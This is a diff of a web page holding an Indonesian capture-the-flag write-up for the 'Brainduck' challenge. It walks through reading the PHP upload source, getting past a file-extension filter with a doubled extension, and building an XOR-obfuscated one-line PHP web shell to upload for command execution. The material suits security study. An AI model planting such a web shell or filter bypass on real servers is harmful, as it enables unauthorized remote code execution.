@@ -8,7 +8,7 @@
 <meta name="description" content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
 Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
 Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
-&amp;lt;?phpif (isset($_GET[&amp;#34;debug&amp;#34;])) {highlight_file(__FILE__);die();}function processUpload() {if (!is_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;])) {throw new Exception(&amp;#39;Bukan file terupload&amp;#39;);}if ($_FILES[&amp;#39;file&amp;#39;][&amp;#39;size&amp;#39;] &amp;gt; 500) {throw new Exception(&amp;#39;Ukuran file tidak boleh melebihi 500 bytes&amp;#39;);}// harusnya cuma boleh &amp;gt;&amp;lt;&#43;-[]." />
+&amp;lt;?php if (isset($_GET[&amp;#34;debug&amp;#34;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;])) { throw new Exception(&amp;#39;Bukan file terupload&amp;#39;); } if ($_FILES[&amp;#39;file&amp;#39;][&amp;#39;size&amp;#39;] &amp;gt; 500) { throw new Exception(&amp;#39;Ukuran file tidak boleh melebihi 500 bytes&amp;#39;); } // harusnya cuma boleh &amp;gt;&amp;lt;&#43;-[]." />
 <meta name="keywords" content="tutorial, computer, computer science, programming, php, html, python, js, javascript" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -38,22 +38,23 @@ Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat
 <meta itemprop="description" content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
 Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
 Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
-&lt;?phpif (isset($_GET[&#34;debug&#34;])) {highlight_file(__FILE__);die();}function processUpload() {if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) {throw new Exception(&#39;Bukan file terupload&#39;);}if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) {throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;);}// harusnya cuma boleh &gt;&lt;&#43;-[].">
-<meta itemprop="datePublished" content="2019-02-10T02:46:54&#43;00:00" />
-<meta itemprop="dateModified" content="2019-02-10T02:46:54&#43;00:00" />
-<meta itemprop="wordCount" content="520">
+&lt;?php if (isset($_GET[&#34;debug&#34;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) { throw new Exception(&#39;Bukan file terupload&#39;); } if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) { throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;); } // harusnya cuma boleh &gt;&lt;&#43;-[].">
+<meta itemprop="datePublished" content="2019-02-10T02:46:54+00:00" />
+<meta itemprop="dateModified" content="2019-02-10T02:46:54+00:00" />
+<meta itemprop="wordCount" content="519">
 <meta itemprop="image" content="https://cacadosman.com/"/>
 
 
 
-<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cacadosman.com/"/>
 
 <meta name="twitter:title" content="Writeup CTF Brainduck Final Arkavidia 5.0"/>
 <meta name="twitter:description" content="Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
 Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
 Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
-&lt;?phpif (isset($_GET[&#34;debug&#34;])) {highlight_file(__FILE__);die();}function processUpload() {if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) {throw new Exception(&#39;Bukan file terupload&#39;);}if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) {throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;);}// harusnya cuma boleh &gt;&lt;&#43;-[]."/>
+&lt;?php if (isset($_GET[&#34;debug&#34;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) { throw new Exception(&#39;Bukan file terupload&#39;); } if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 500) { throw new Exception(&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;); } // harusnya cuma boleh &gt;&lt;&#43;-[]."/>
 
 
 
@@ -138,7 +139,7 @@ Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat
 <p><img src="/wp-content/2019/02/bd.png" alt=""></p>
 <p>Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.</p>
 <p>Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
   <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;debug&#34;</span>])) {
     <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
@@ -192,70 +193,70 @@ Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat
       $error <span style="color:#f92672">=</span> $e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>();
     }
   }
-<span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;!-- /?debug=V --&gt;</span>
-<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-&lt;<span style="color:#f92672">html</span>&gt;
-  &lt;<span style="color:#f92672">head</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;
-    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span>&gt;
-
-    &lt;<span style="color:#f92672">title</span>&gt;Brainduck&lt;/<span style="color:#f92672">title</span>&gt;
-
-    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vendor/bootstrap/css/bootstrap.min.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
-  &lt;/<span style="color:#f92672">head</span>&gt;
-
-  &lt;<span style="color:#f92672">body</span>&gt;
-    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container-fluid&#34;</span>&gt;
-
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($error)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-danger&#34;</span>&gt;
-        <span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($error); <span style="color:#75715e">?&gt;</span>
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">elseif</span>($file)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert alert-success&#34;</span>&gt;
-        File sukses terupload. &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($file); <span style="color:#75715e">?&gt;</span><span style="color:#e6db74">&#34;</span>&gt;Download&lt;/<span style="color:#f92672">a</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>($output <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-danger&#34;</span>&gt;
-          Tidak ada output atau terjadi error
-        &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> <span style="color:#75715e">?&gt;</span>
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header alert alert-success&#34;</span>&gt;
-          Output
-        &lt;/<span style="color:#f92672">div</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
-          &lt;<span style="color:#f92672">code</span>&gt;<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($output); <span style="color:#75715e">?&gt;</span>&lt;/<span style="color:#f92672">code</span>&gt;
-        &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-<span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">endif</span>; <span style="color:#75715e">?&gt;</span>
-
-      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mb-3&#34;</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-header&#34;</span>&gt;
-          Upload file Brainduck
-        &lt;/<span style="color:#f92672">div</span>&gt;
-        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
-          Contoh:
-          &lt;<span style="color:#f92672">ul</span>&gt;
-            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/hello_world.bf&#34;</span>&gt;Hello World!&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
-            &lt;<span style="color:#f92672">li</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;examples/squares.bf&#34;</span>&gt;Bilangan Kuadrat&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;
-          &lt;/<span style="color:#f92672">ul</span>&gt;
-          &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
-            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">required</span>&gt;
-            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-primary&#34;</span>&gt;Upload&lt;/<span style="color:#f92672">button</span>&gt;
-          &lt;/<span style="color:#f92672">form</span>&gt;
-        &lt;/<span style="color:#f92672">div</span>&gt;
-      &lt;/<span style="color:#f92672">div</span>&gt;
-    &lt;/<span style="color:#f92672">div</span>&gt;
-  &lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;!-- /?debug=V --&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;head&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta charset=&#34;utf-8&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;Brainduck&lt;/title&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">    &lt;link href=&#34;vendor/bootstrap/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;/head&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">  &lt;body&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;div class=&#34;container-fluid&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($error): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;alert alert-danger&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;?php echo htmlspecialchars($error); ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php elseif($file): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;alert alert-success&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        File sukses terupload. &lt;a href=&#34;&lt;?php echo htmlspecialchars($file); ?&gt;&#34;&gt;Download&lt;/a&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($output !== null): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($output === &#34;&#34;): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header alert alert-danger&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Tidak ada output atau terjadi error
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php else: ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;card mb-3&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header alert alert-success&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Output
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-body&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;code&gt;&lt;?php echo htmlspecialchars($output); ?&gt;&lt;/code&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;card mb-3&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Upload file Brainduck
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-body&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Contoh:
+</span><span style="color:#960050;background-color:#1e0010">          &lt;ul&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;li&gt;&lt;a href=&#34;examples/hello_world.bf&#34;&gt;Hello World!&lt;/a&gt;&lt;/li&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;li&gt;&lt;a href=&#34;examples/squares.bf&#34;&gt;Bilangan Kuadrat&lt;/a&gt;&lt;/li&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;/ul&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;form method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;input type=&#34;file&#34; name=&#34;file&#34; required&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary&#34;&gt;Upload&lt;/button&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;/body&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div><p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>
 <p>Loh kok upload file?</p>
 <ol>
 <li>Karena bisa didownload/diakses</li>
@@ -268,7 +269,7 @@ Dengan cara merubah ekstensi menjadi namafile.ph.phpp, sehingga akan menjadi nam
 Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bisa melakukan String XOR.</p>
 <p>Kita akan melakukan XOR string &ldquo;<strong>`{{{</strong>&rdquo; dengan string &ldquo;<strong>?&lt;&gt;/</strong>&rdquo; yang dimana empat karakter tersebut jika diXOR akan menghasilkan _GET</p>
 <p>Lalu kita tinggal merangkainya menjadi sebuah shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>](${$_}[<span style="color:#a6e22e">___</span>]));
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>](${$_}[<span style="color:#a6e22e">___</span>]));
 </code></pre></div><p>lalu simpan dengan nama shell.ph.phpp dan langsung saja kita upload.</p>
 <p>Akhirnya kita bisa melakukan akses shell dengan mengakses alamat berikut:</p>
 <!-- raw HTML omitted -->
